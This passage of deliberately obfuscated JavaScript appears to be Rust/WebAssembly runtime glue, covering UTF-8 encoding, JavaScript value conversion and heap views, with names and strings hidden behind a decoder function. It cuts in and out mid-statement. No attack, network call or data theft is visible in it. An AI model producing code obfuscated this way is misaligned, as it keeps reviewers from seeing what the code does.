_0x4e59aa=_0x545cf2[_0x52b8('15a','\x58\x24\x25\x73')],_0x2d88a9=0x0;_0x629afb[_0x52b8('15b','\x6b\x6f\x29\x50')](_0x2d88a9,_0x4bdd4c['\x6c\x65\x6e\x67\x74\x68']);++_0x2d88a9){var _0x260a4a=_0x4bdd4c[_0x52b8('6a','\x47\x38\x41\x23')](_0x2d88a9);_0x629afb[_0x52b8('15c','\x56\x74\x75\x5b')](_0x260a4a,0xd800)&&_0x629afb['\x4f\x6d\x6a\x58\x58'](_0x260a4a,0xdfff)&&(_0x260a4a=_0x629afb[_0x52b8('15d','\x67\x26\x4d\x4e')](_0x629afb[_0x52b8('15e','\x32\x4b\x4d\x68')](0x10000,_0x629afb[_0x52b8('15f','\x70\x58\x38\x32')](_0x629afb[_0x52b8('160','\x67\x56\x57\x47')](0x3ff,_0x260a4a),0xa)),_0x629afb['\x57\x4c\x54\x4a\x4a'](0x3ff,_0x4bdd4c[_0x52b8('161','\x70\x58\x38\x32')](++_0x2d88a9)))),_0x629afb['\x4f\x6d\x6a\x58\x58'](_0x260a4a,0x7f)?_0x4e59aa[_0x58c2e1++]=_0x260a4a:_0x629afb['\x77\x41\x71\x61\x52'](_0x260a4a,0x7ff)?(_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('162','\x28\x64\x70\x75')](0xc0,_0x629afb[_0x52b8('163','\x56\x74\x75\x5b')](_0x260a4a,0x6)),_0x4e59aa[_0x58c2e1++]=_0x629afb['\x7a\x53\x57\x79\x76'](0x80,_0x629afb[_0x52b8('164','\x6b\x6f\x29\x50')](0x3f,_0x260a4a))):_0x629afb['\x77\x41\x71\x61\x52'](_0x260a4a,0xffff)?(_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('165','\x66\x47\x4f\x5b')](0xe0,_0x629afb[_0x52b8('166','\x67\x56\x57\x47')](_0x260a4a,0xc)),_0x4e59aa[_0x58c2e1++]=_0x629afb['\x78\x50\x6d\x62\x6a'](0x80,_0x629afb[_0x52b8('167','\x5e\x41\x36\x4b')](_0x629afb[_0x52b8('168','\x64\x44\x63\x54')](_0x260a4a,0x6),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('169','\x38\x50\x71\x53')](0x80,_0x629afb[_0x52b8('16a','\x55\x63\x50\x2a')](0x3f,_0x260a4a))):_0x629afb[_0x52b8('16b','\x59\x73\x7a\x26')](_0x260a4a,0x1fffff)?(_0x4e59aa[_0x58c2e1++]=_0x629afb['\x62\x62\x61\x58\x67'](0xf0,_0x629afb[_0x52b8('16c','\x70\x66\x40\x6e')](_0x260a4a,0x12)),_0x4e59aa[_0x58c2e1++]=_0x629afb['\x62\x62\x61\x58\x67'](0x80,_0x629afb['\x57\x74\x4e\x69\x6a'](_0x629afb['\x47\x5a\x4f\x70\x57'](_0x260a4a,0xc),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('16d','\x47\x38\x41\x23')](0x80,_0x629afb[_0x52b8('16e','\x76\x46\x41\x68')](_0x629afb[_0x52b8('16f','\x46\x4b\x78\x79')](_0x260a4a,0x6),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb['\x48\x44\x7a\x49\x6b'](0x80,_0x629afb[_0x52b8('170','\x28\x25\x25\x25')](0x3f,_0x260a4a))):_0x629afb[_0x52b8('171','\x29\x7a\x73\x5b')](_0x260a4a,0x3ffffff)?(_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('172','\x70\x58\x38\x32')](0xf8,_0x629afb[_0x52b8('173','\x42\x79\x6b\x23')](_0x260a4a,0x18)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('174','\x2a\x47\x64\x5e')](0x80,_0x629afb['\x76\x46\x57\x63\x62'](_0x629afb[_0x52b8('175','\x52\x6e\x61\x4a')](_0x260a4a,0x12),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('176','\x29\x7a\x73\x5b')](0x80,_0x629afb[_0x52b8('177','\x67\x56\x57\x47')](_0x629afb[_0x52b8('178','\x28\x64\x70\x75')](_0x260a4a,0xc),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb['\x62\x51\x65\x66\x6c'](0x80,_0x629afb['\x76\x46\x57\x63\x62'](_0x629afb['\x63\x6f\x66\x7a\x52'](_0x260a4a,0x6),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('179','\x62\x62\x29\x6a')](0x80,_0x629afb[_0x52b8('17a','\x34\x6f\x33\x70')](0x3f,_0x260a4a))):(_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('17b','\x31\x31\x78\x6c')](0xfc,_0x629afb['\x63\x6f\x66\x7a\x52'](_0x260a4a,0x1e)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('17c','\x76\x46\x41\x68')](0x80,_0x629afb[_0x52b8('17d','\x31\x31\x78\x6c')](_0x629afb['\x63\x6f\x66\x7a\x52'](_0x260a4a,0x18),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('17e','\x71\x41\x46\x73')](0x80,_0x629afb[_0x52b8('17f','\x66\x47\x4f\x5b')](_0x629afb[_0x52b8('180','\x70\x77\x62\x54')](_0x260a4a,0x12),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb['\x68\x61\x52\x6c\x70'](0x80,_0x629afb['\x66\x4b\x58\x4d\x41'](_0x629afb[_0x52b8('181','\x64\x5e\x23\x6e')](_0x260a4a,0xc),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('182','\x55\x71\x73\x58')](0x80,_0x629afb[_0x52b8('183','\x71\x41\x46\x73')](_0x629afb[_0x52b8('184','\x45\x31\x29\x5e')](_0x260a4a,0x6),0x3f)),_0x4e59aa[_0x58c2e1++]=_0x629afb[_0x52b8('185','\x42\x43\x4a\x50')](0x80,_0x629afb[_0x52b8('186','\x59\x73\x7a\x26')](0x3f,_0x260a4a)));}},_0x545cf2[_0x52b8('187','\x73\x56\x6a\x39')][_0x52b8('188','\x51\x5b\x73\x47')]=function(){},_0x545cf2[_0x52b8('189','\x28\x64\x70\x75')]['\x74\x6f\x5f\x6a\x73']=function(_0x4bdd4c){var _0x389cb4={'\x71\x4e\x63\x79\x6e':function(_0x4ff932,_0x15440a){return _0x47ead8[_0x52b8('18a','\x46\x4b\x78\x79')](_0x4ff932,_0x15440a);},'\x42\x45\x5a\x76\x56':function(_0x38b6bc,_0x1a3837){return _0x47ead8[_0x52b8('18b','\x55\x71\x73\x58')](_0x38b6bc,_0x1a3837);},'\x58\x52\x6e\x76\x75':function(_0x304cb4,_0x138cdd){return _0x47ead8[_0x52b8('18c','\x31\x31\x78\x6c')](_0x304cb4,_0x138cdd);},'\x44\x62\x56\x6e\x67':function(_0x33b230,_0x73c0eb){return _0x47ead8[_0x52b8('18d','\x5e\x41\x36\x4b')](_0x33b230,_0x73c0eb);},'\x63\x42\x68\x51\x62':function(_0x5c4d33,_0x2ae3fb){return _0x47ead8[_0x52b8('18e','\x58\x24\x25\x73')](_0x5c4d33,_0x2ae3fb);},'\x4d\x6f\x57\x70\x77':function(_0x3c5de3,_0x4e0af6){return _0x47ead8['\x72\x69\x66\x47\x42'](_0x3c5de3,_0x4e0af6);},'\x62\x48\x5a\x7a\x52':function(_0x83b16a,_0x41bd7a){return _0x47ead8[_0x52b8('18f','\x28\x25\x25\x25')](_0x83b16a,_0x41bd7a);},'\x61\x69\x68\x4a\x6a':function(_0x282ad5,_0x1ea87c){return _0x47ead8['\x50\x62\x50\x64\x7a'](_0x282ad5,_0x1ea87c);},'\x6b\x72\x6d\x74\x65':function(_0x421d3e,_0x472229){return _0x47ead8[_0x52b8('190','\x5d\x63\x5a\x66')](_0x421d3e,_0x472229);},'\x54\x68\x41\x67\x5a':_0x47ead8['\x57\x67\x67\x51\x46'],'\x41\x74\x7a\x7a\x6e':function(_0x2f5f29,_0x344ce5){return _0x47ead8[_0x52b8('191','\x59\x73\x7a\x26')](_0x2f5f29,_0x344ce5);},'\x41\x6d\x4e\x6e\x43':function(_0x2cead4,_0x17a28a){return _0x47ead8[_0x52b8('192','\x64\x5e\x23\x6e')](_0x2cead4,_0x17a28a);}};var _0x58c2e1=_0x545cf2[_0x52b8('193','\x45\x31\x29\x5e')][_0x47ead8[_0x52b8('194','\x6b\x6f\x29\x50')](_0x4bdd4c,0xc)];if(_0x47ead8[_0x52b8('195','\x29\x7a\x73\x5b')](0x0,_0x58c2e1)){if(_0x47ead8['\x69\x74\x6c\x67\x4a'](0x1,_0x58c2e1))return null;if(_0x47ead8[_0x52b8('196','\x64\x5e\x23\x6e')](0x2,_0x58c2e1))return _0x545cf2['\x48\x45\x41\x50\x33\x32'][_0x47ead8[_0x52b8('197','\x71\x41\x46\x73')](_0x4bdd4c,0x4)];if(_0x47ead8['\x64\x57\x75\x4e\x72'](0x3,_0x58c2e1))return _0x545cf2[_0x52b8('198','\x47\x38\x41\x23')][_0x47ead8[_0x52b8('199','\x55\x63\x50\x2a')](_0x4bdd4c,0x8)];if(_0x47ead8[_0x52b8('19a','\x70\x59\x54\x65')](0x4,_0x58c2e1)){if(_0x47ead8[_0x52b8('19b','\x42\x43\x4a\x50')](_0x47ead8[_0x52b8('19c','\x49\x43\x28\x41')],_0x47ead8['\x77\x4b\x41\x7a\x58'])){if(_0x629afb['\x63\x62\x75\x50\x78'](0x0,_0x40c807)){_0x260a4a[_0x52b8('19d','\x70\x77\x62\x54')]=_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('19e','\x65\x34\x59\x79')];var _0x8897ff=_0x4e59aa;_0x4e59aa=0x0,_0x629afb['\x6d\x64\x6e\x61\x63'](0x0,_0x8897ff)&&_0x545cf2[_0x52b8('19f','\x5d\x63\x5a\x66')][_0x52b8('1a0','\x28\x25\x25\x25')]('\x76\x69',_0x3d52eb,[_0x8897ff]);}else _0x27b5e5=!0x0;}else{var _0x4e59aa=_0x545cf2[_0x52b8('1a1','\x70\x66\x40\x6e')][_0x47ead8['\x4f\x51\x4d\x44\x41'](_0x4bdd4c,0x4)],_0x2d88a9=_0x545cf2[_0x52b8('1a2','\x55\x71\x73\x58')][_0x47ead8[_0x52b8('1a3','\x71\x41\x46\x73')](_0x47ead8[_0x52b8('1a4','\x55\x4e\x45\x6d')](_0x4bdd4c,0x4),0x4)];return _0x545cf2[_0x52b8('1a5','\x55\x71\x73\x58')][_0x52b8('1a6','\x42\x43\x4a\x50')](_0x4e59aa,_0x2d88a9);}}if(_0x47ead8['\x75\x77\x62\x7a\x7a'](0x5,_0x58c2e1))return!0x1;if(_0x47ead8[_0x52b8('1a7','\x58\x24\x25\x73')](0x6,_0x58c2e1))return!0x0;if(_0x47ead8[_0x52b8('1a8','\x38\x30\x74\x63')](0x7,_0x58c2e1)){_0x4e59aa=_0x47ead8[_0x52b8('1a9','\x40\x25\x53\x76')](_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('1aa','\x67\x26\x4d\x4e')],_0x545cf2['\x48\x45\x41\x50\x55\x33\x32'][_0x47ead8[_0x52b8('1ab','\x33\x77\x24\x77')](_0x4bdd4c,0x4)]),_0x2d88a9=_0x545cf2['\x48\x45\x41\x50\x55\x33\x32'][_0x47ead8[_0x52b8('1ac','\x58\x24\x25\x73')](_0x47ead8[_0x52b8('1ad','\x70\x66\x40\x6e')](_0x4bdd4c,0x4),0x4)];for(var _0x260a4a=[],_0x43a3e7=0x0;_0x47ead8['\x6a\x49\x47\x67\x74'](_0x43a3e7,_0x2d88a9);++_0x43a3e7)_0x260a4a[_0x52b8('1ae','\x54\x29\x5b\x45')](_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('1af','\x45\x31\x29\x5e')](_0x47ead8['\x4c\x48\x77\x58\x79'](_0x4e59aa,_0x47ead8[_0x52b8('1b0','\x2a\x38\x4d\x52')](0x10,_0x43a3e7))));return _0x260a4a;}if(_0x47ead8['\x6a\x75\x41\x78\x4b'](0x8,_0x58c2e1)){var _0x3088c7=_0x545cf2[_0x52b8('189','\x28\x64\x70\x75')][_0x52b8('1b1','\x38\x30\x74\x63')],_0x4f45e4=_0x47ead8[_0x52b8('1b2','\x38\x50\x71\x53')](_0x3088c7,_0x545cf2['\x48\x45\x41\x50\x55\x33\x32'][_0x47ead8[_0x52b8('1b3','\x64\x5e\x23\x6e')](_0x4bdd4c,0x4)]),_0x1627c2=(_0x2d88a9=_0x545cf2[_0x52b8('1b4','\x55\x4e\x45\x6d')][_0x47ead8[_0x52b8('1b5','\x56\x74\x75\x5b')](_0x47ead8['\x59\x59\x6c\x75\x52'](_0x4bdd4c,0x4),0x4)],_0x47ead8[_0x52b8('1b6','\x54\x29\x5b\x45')](_0x3088c7,_0x545cf2[_0x52b8('1b7','\x70\x58\x38\x32')][_0x47ead8['\x69\x4a\x49\x42\x6b'](_0x47ead8[_0x52b8('1b8','\x5d\x47\x45\x51')](_0x4bdd4c,0x8),0x4)]));for(_0x260a4a={},_0x43a3e7=0x0;_0x47ead8[_0x52b8('1b9','\x59\x73\x7a\x26')](_0x43a3e7,_0x2d88a9);++_0x43a3e7){var _0x2b2a37=_0x545cf2[_0x52b8('1ba','\x42\x79\x6b\x23')][_0x47ead8['\x51\x6e\x49\x54\x62'](_0x47ead8[_0x52b8('1bb','\x56\x74\x75\x5b')](_0x1627c2,_0x47ead8[_0x52b8('1bc','\x29\x7a\x73\x5b')](0x8,_0x43a3e7)),0x4)],_0x4c735a=_0x545cf2[_0x52b8('1bd','\x38\x30\x74\x63')][_0x47ead8[_0x52b8('1be','\x31\x31\x78\x6c')](_0x47ead8[_0x52b8('1bf','\x70\x59\x54\x65')](_0x47ead8[_0x52b8('1bf','\x70\x59\x54\x65')](_0x1627c2,0x4),_0x47ead8[_0x52b8('1c0','\x54\x29\x5b\x45')](0x8,_0x43a3e7)),0x4)],_0x4c9d6c=_0x545cf2[_0x52b8('1c1','\x61\x44\x73\x29')]['\x74\x6f\x5f\x6a\x73\x5f\x73\x74\x72\x69\x6e\x67'](_0x2b2a37,_0x4c735a),_0x4b69d9=_0x545cf2[_0x52b8('1c2','\x6b\x6f\x29\x50')]['\x74\x6f\x5f\x6a\x73'](_0x47ead8['\x78\x48\x44\x59\x43'](_0x4f45e4,_0x47ead8[_0x52b8('1c3','\x34\x6f\x33\x70')](0x10,_0x43a3e7)));_0x260a4a[_0x4c9d6c]=_0x4b69d9;}return _0x260a4a;}if(_0x47ead8[_0x52b8('1c4','\x56\x74\x75\x5b')](0x9,_0x58c2e1))return _0x545cf2[_0x52b8('1c5','\x67\x26\x4d\x4e')][_0x52b8('1c6','\x45\x31\x29\x5e')](_0x545cf2['\x48\x45\x41\x50\x33\x32'][_0x47ead8[_0x52b8('1c7','\x33\x77\x24\x77')](_0x4bdd4c,0x4)]);if(_0x47ead8[_0x52b8('1c8','\x67\x26\x4d\x4e')](0xa,_0x58c2e1)||_0x47ead8[_0x52b8('1c9','\x42\x79\x6b\x23')](0xc,_0x58c2e1)||_0x47ead8[_0x52b8('1ca','\x5d\x47\x45\x51')](0xd,_0x58c2e1)){if(_0x47ead8[_0x52b8('1cb','\x42\x43\x4a\x50')](_0x47ead8[_0x52b8('1cc','\x61\x44\x73\x29')],_0x47ead8[_0x52b8('1cd','\x38\x30\x74\x63')])){if(_0x389cb4['\x71\x4e\x63\x79\x6e'](void 0x0,_0x4bdd4c)||_0x389cb4[_0x52b8('1ce','\x70\x59\x54\x65')](null,_0x4bdd4c))return 0x0;var _0x275c1d=_0x545cf2[_0x52b8('187','\x73\x56\x6a\x39')][_0x52b8('1cf','\x46\x4b\x78\x79')],_0x3ac04c=_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('1d0','\x32\x4b\x4d\x68')],_0x3aa191=_0x545cf2[_0x52b8('1d1','\x40\x25\x53\x76')][_0x52b8('1d2','\x38\x50\x71\x53')],_0x4ae113=_0x545cf2[_0x52b8('1d3','\x42\x43\x4a\x50')][_0x52b8('1d4','\x70\x59\x54\x65')],_0x4cc059=_0x3aa191['\x67\x65\x74'](_0x4bdd4c);if(_0x389cb4[_0x52b8('1d5','\x29\x7a\x73\x5b')](void 0x0,_0x4cc059)&&(_0x4cc059=_0x4ae113[_0x52b8('1d6','\x73\x56\x6a\x39')](_0x4bdd4c)),_0x389cb4[_0x52b8('1d7','\x56\x24\x55\x57')](void 0x0,_0x4cc059)){_0x4cc059=_0x545cf2[_0x52b8('1d8','\x56\x24\x55\x57')]['\x6c\x61\x73\x74\x5f\x72\x65\x66\x69\x64']++;try{_0x3aa191['\x73\x65\x74'](_0x4bdd4c,_0x4cc059);}catch(_0x4eb4f0){_0x4ae113[_0x52b8('1d9','\x61\x44\x73\x29')](_0x4bdd4c,_0x4cc059);}}return _0x389cb4['\x58\x52\x6e\x76\x75'](_0x4cc059,_0x3ac04c)?_0x275c1d[_0x4cc059]++:(_0x3ac04c[_0x4cc059]=_0x4bdd4c,_0x275c1d[_0x4cc059]=0x1),_0x4cc059;}else{var _0x4f8175=_0x545cf2[_0x52b8('1da','\x34\x6f\x33\x70')][_0x47ead8[_0x52b8('1db','\x49\x43\x28\x41')](_0x4bdd4c,0x4)],_0x3d52eb=(_0x4e59aa=_0x545cf2[_0x52b8('1dc','\x2a\x47\x64\x5e')][_0x47ead8['\x6a\x64\x59\x64\x69'](_0x47ead8[_0x52b8('1dd','\x38\x50\x71\x53')](_0x4bdd4c,0x4),0x4)],_0x545cf2[_0x52b8('1de','\x55\x63\x50\x2a')][_0x47ead8['\x6b\x6a\x53\x6f\x61'](_0x47ead8[_0x52b8('1df','\x64\x44\x63\x54')](_0x4bdd4c,0x8),0x4)]),_0x40c807=0x0,_0x27b5e5=!0x1;return(_0x260a4a=function _0x4bdd4c(){if(_0x629afb[_0x52b8('1e0','\x42\x43\x4a\x50')](_0x629afb[_0x52b8('1e1','\x52\x6e\x61\x4a')],_0x629afb[_0x52b8('1e2','\x32\x4b\x4d\x68')])){return _0x545cf2[_0x52b8('1e3','\x61\x44\x73\x29')](_0x4bdd4c);}else{if(_0x629afb['\x6f\x71\x44\x46\x78'](0x0,_0x4e59aa)||_0x629afb['\x56\x67\x6f\x43\x58'](!0x0,_0x27b5e5))throw _0x629afb[_0x52b8('1e4','\x38\x50\x71\x53')](0xa,_0x58c2e1)?new ReferenceError(_0x629afb['\x76\x4a\x77\x76\x7a']):_0x629afb['\x56\x67\x6f\x43\x58'](0xc,_0x58c2e1)?new ReferenceError(_0x629afb[_0x52b8('1e5','\x42\x43\x4a\x50')]):new ReferenceError(_0x629afb['\x4b\x6f\x6a\x44\x72']);var _0x2d88a9=_0x4e59aa;if(_0x629afb[_0x52b8('1e6','\x38\x50\x71\x53')](0xd,_0x58c2e1)&&(_0x4bdd4c['\x64\x72\x6f\x70']=_0x545cf2[_0x52b8('1e7','\x51\x5b\x73\x47')][_0x52b8('1e8','\x42\x43\x4a\x50')],_0x4e59aa=0x0),_0x629afb[_0x52b8('1e9','\x64\x5e\x23\x6e')](0x0,_0x40c807)&&(_0x629afb[_0x52b8('1ea','\x42\x43\x4a\x50')](0xc,_0x58c2e1)||_0x629afb['\x47\x51\x63\x7a\x51'](0xd,_0x58c2e1)))throw new ReferenceError(_0x629afb[_0x52b8('1eb','\x67\x26\x4d\x4e')]);var _0x260a4a=_0x545cf2['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x52b8('1ec','\x76\x46\x41\x68')](0x10);_0x545cf2[_0x52b8('1ed','\x38\x50\x71\x53')][_0x52b8('1ee','\x76\x46\x41\x68')](_0x260a4a,arguments);try{if(_0x629afb[_0x52b8('1ef','\x21\x50\x6b\x42')](_0x629afb[_0x52b8('1f0','\x6b\x6f\x29\x50')],_0x629afb[_0x52b8('1f1','\x56\x24\x55\x57')])){_0x40c807+=0x1,_0x545cf2[_0x52b8('187','\x73\x56\x6a\x39')][_0x52b8('1f2','\x5d\x47\x45\x51')](_0x629afb[_0x52b8('1f3','\x38\x50\x71\x53')],_0x4f8175,[_0x2d88a9,_0x260a4a]);var _0x43a3e7=_0x545cf2[_0x52b8('1f4','\x5d\x47\x45\x51')][_0x52b8('1f5','\x70\x59\x54\x65')];_0x545cf2[_0x52b8('1f6','\x66\x47\x4f\x5b')][_0x52b8('1f7','\x5d\x47\x45\x51')]=null;}else{var _0x584002=_0x545cf2[_0x52b8('1f8','\x46\x4b\x78\x79')][_0x389cb4['\x44\x62\x56\x6e\x67'](_0x389cb4[_0x52b8('1f9','\x55\x4e\x45\x6d')](_0x1627c2,_0x389cb4[_0x52b8('1fa','\x29\x7a\x73\x5b')](0x8,_0x43a3e7)),0x4)],_0x1bc1e6=_0x545cf2[_0x52b8('1fb','\x59\x73\x7a\x26')][_0x389cb4[_0x52b8('1fc','\x65\x34\x59\x79')](_0x389cb4[_0x52b8('1fd','\x70\x66\x40\x6e')](_0x389cb4[_0x52b8('1fe','\x70\x58\x38\x32')](_0x1627c2,0x4),_0x389cb4['\x4d\x6f\x57\x70\x77'](0x8,_0x43a3e7)),0x4)],_0x5e4e5a=_0x545cf2[_0x52b8('1ff','\x32\x4b\x4d\x68')]['\x74\x6f\x5f\x6a\x73\x5f\x73\x74\x72\x69\x6e\x67'](_0x584002,_0x1bc1e6),_0x4a6090=_0x545cf2[_0x52b8('200','\x64\x44\x63\x54')]['\x74\x6f\x5f\x6a\x73'](_0x389cb4['\x61\x69\x68\x4a\x6a'](_0x4f45e4,_0x389cb4[_0x52b8('201','\x55\x63\x50\x2a')](0x10,_0x43a3e7)));_0x260a4a[_0x5e4e5a]=_0x4a6090;}}finally{_0x40c807-=0x1;}return _0x629afb['\x66\x43\x54\x53\x5a'](!0x0,_0x27b5e5)&&_0x629afb[_0x52b8('202','\x33\x77\x24\x77')](0x0,_0x40c807)&&_0x4bdd4c[_0x52b8('203','\x52\x6e\x61\x4a')](),_0x43a3e7;}})[_0x52b8('204','\x28\x64\x70\x75')]=function(){if(_0x389cb4[_0x52b8('205','\x52\x6e\x61\x4a')](_0x389cb4[_0x52b8('206','\x34\x6f\x33\x70')],_0x389cb4[_0x52b8('207','\x62\x62\x29\x6a')])){var _0x2aaf03=_0x545cf2[_0x52b8('208','\x38\x30\x74\x63')][_0x52b8('209','\x55\x4e\x45\x6d')][_0x52b8('20a','\x55\x71\x73\x58')][_0x52b8('20b','\x46\x4b\x78\x79')];_0x4e59aa=new Int8Array(_0x2aaf03),_0x260a4a=new Int16Array(_0x2aaf03),_0x3088c7=new Int32Array(_0x2aaf03),_0x1627c2=new Uint8Array(_0x2aaf03),_0x4c735a=new Uint16Array(_0x2aaf03),_0x4c9d6c=new Uint32Array(_0x2aaf03),_0x4b69d9=new Float32Array(_0x2aaf03),_0x4f8175=new Float64Array(_0x2aaf03),_0x545cf2[_0x52b8('20c','\x6b\x6f\x29\x50')]=_0x4e59aa,_0x545cf2[_0x52b8('20d','\x52\x6e\x61\x4a')]=_0x260a4a,_0x545cf2[_0x52b8('20e','\x64\x44\x63\x54')]=_0x3088c7,_0x545cf2['\x48\x45\x41\x50\x55\x38']=_0x1627c2,_0x545cf2[_0x52b8('20f','\x51\x5b\x73\x47')]=_0x4c735a,_0x545cf2[_0x52b8('210','\x76\x46\x41\x68')]=_0x4c9d6c,_0x545cf2[_0x52b8('211','\x25\x28\x75\x71')]=_0x4b69d9,_0x545cf2['\x48\x45\x41\x50\x46\x36\x34']=_0x4f8175;}else{if(_0x389cb4['\x41\x74\x7a\x7a\x6e'](0x0,_0x40c807)){_0x260a4a[_0x52b8('212','\x38\x50\x71\x53')]=_0x545cf2[_0x52b8('213','\x28\x25\x25\x25')][_0x52b8('214','\x49\x43\x28\x41')];var _0x4bdd4c=_0x4e59aa;_0x4e59aa=0x0,_0x389cb4['\x41\x6d\x4e\x6e\x43'](0x0,_0x4bdd4c)&&_0x545cf2[_0x52b8('2c','\x55\x63\x50\x2a')]['\x64\x79\x6e\x63\x61\x6c\x6c']('\x76\x69',_0x3d52eb,[_0x4bdd4c]);}else _0x27b5e5=!0x0;}},_0x260a4a;}}if(_0x47ead8[_0x52b8('215','\x5d\x63\x5a\x66')](0xe,_0x58c2e1)){_0x4e59aa=_0x545cf2['\x48\x45\x41\x50\x55\x33\x32'][_0x47ead8['\x6b\x6a\x53\x6f\x61'](_0x4bdd4c,0x4)],_0x2d88a9=_0x545cf2[_0x52b8('1da','\x34\x6f\x33\x70')][_0x47ead8[_0x52b8('216','\x34\x6f\x33\x70')](_0x47ead8['\x7a\x55\x65\x50\x45'](_0x4bdd4c,0x4),0x4)];var _0x223342=_0x545cf2[_0x52b8('217','\x45\x31\x29\x5e')][_0x47ead8[_0x52b8('218','\x33\x77\x24\x77')](_0x47ead8[_0x52b8('219','\x55\x63\x50\x2a')](_0x4bdd4c,0x8),0x4)],_0x598467=_0x47ead8[_0x52b8('21a','\x56\x74\x75\x5b')](_0x4e59aa,_0x2d88a9);switch(_0x223342){case 0x0:return _0x545cf2[_0x52b8('21b','\x2a\x38\x4d\x52')]['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4e59aa,_0x598467);case 0x1:return _0x545cf2[_0x52b8('21c','\x70\x77\x62\x54')][_0x52b8('21d','\x54\x29\x5b\x45')](_0x4e59aa,_0x598467);case 0x2:return _0x545cf2['\x48\x45\x41\x50\x55\x31\x36']['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4e59aa,_0x598467);case 0x3:return _0x545cf2['\x48\x45\x41\x50\x31\x36'][_0x52b8('21e','\x59\x73\x7a\x26')](_0x4e59aa,_0x598467);case 0x4:return _0x545cf2[_0x52b8('1fb','\x59\x73\x7a\x26')][_0x52b8('21f','\x67\x56\x57\x47')](_0x4e59aa,_0x598467);case 0x5:return _0x545cf2[_0x52b8('220','\x29\x7a\x73\x5b')]['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4e59aa,_0x598467);case 0x6:return _0x545cf2[_0x52b8('221','\x2a\x47\x64\x5e')][_0x52b8('222','\x38\x50\x71\x53')](_0x4e59aa,_0x598467);case 0x7:return _0x545cf2['\x48\x45\x41\x50\x46\x36\x34']['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4e59aa,_0x598467);}}else if(_0x47ead8['\x74\x6f\x4b\x51\x54'](0xf,_0x58c2e1))return _0x545cf2[_0x52b8('223','\x58\x24\x25\x73')]['\x67\x65\x74\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](_0x545cf2[_0x52b8('224','\x64\x44\x63\x54')][_0x47ead8['\x67\x52\x4e\x58\x69'](_0x4bdd4c,0x4)]);}},_0x545cf2[_0x52b8('1f4','\x5d\x47\x45\x51')][_0x52b8('225','\x29\x7a\x73\x5b')]=function(_0x4bdd4c,_0x58c2e1){var _0x2035a1={'\x4a\x5a\x54\x47\x51':function(_0x3edcea,_0x3433c2){return _0x47ead8[_0x52b8('226','\x5d\x47\x45\x51')](_0x3edcea,_0x3433c2);},'\x7a\x66\x61\x48\x55':function(_0x1abfb3,_0x511982){return _0x47ead8[_0x52b8('227','\x47\x38\x41\x23')](_0x1abfb3,_0x511982);}};var _0x4e59aa=_0x47ead8[_0x52b8('228','\x33\x77\x24\x77')](_0x2b2a37)(_0x58c2e1),_0x2d88a9=_0x4e59aa['\x6c\x65\x6e\x67\x74\x68'],_0x260a4a=_0x545cf2[_0x52b8('19f','\x5d\x63\x5a\x66')]['\x61\x6c\x6c\x6f\x63'](_0x47ead8[_0x52b8('229','\x55\x63\x50\x2a')](0x8,_0x2d88a9)),_0x43a3e7=_0x545cf2[_0x52b8('22a','\x70\x77\x62\x54')][_0x52b8('22b','\x28\x25\x25\x25')](_0x47ead8['\x67\x6a\x61\x46\x7a'](0x10,_0x2d88a9));_0x545cf2[_0x52b8('22c','\x59\x73\x7a\x26')][_0x47ead8['\x4d\x5a\x72\x77\x4d'](_0x4bdd4c,0xc)]=0x8,_0x545cf2[_0x52b8('22d','\x58\x24\x25\x73')][_0x47ead8[_0x52b8('22e','\x52\x6e\x61\x4a')](_0x4bdd4c,0x4)]=_0x43a3e7,_0x545cf2[_0x52b8('22f','\x62\x62\x29\x6a')][_0x47ead8[_0x52b8('230','\x21\x50\x6b\x42')](_0x47ead8[_0x52b8('231','\x70\x77\x62\x54')](_0x4bdd4c,0x4),0x4)]=_0x2d88a9,_0x545cf2['\x48\x45\x41\x50\x55\x33\x32'][_0x47ead8[_0x52b8('232','\x51\x5b\x73\x47')](_0x47ead8['\x45\x41\x59\x55\x47'](_0x4bdd4c,0x8),0x4)]=_0x260a4a;for(var _0x3088c7=0x0;_0x47ead8[_0x52b8('233','\x62\x62\x29\x6a')](_0x3088c7,_0x2d88a9);++_0x3088c7){if(_0x47ead8['\x75\x48\x5a\x58\x4e'](_0x47ead8[_0x52b8('234','\x52\x6e\x61\x4a')],_0x47ead8[_0x52b8('235','\x46\x4b\x78\x79')])){var 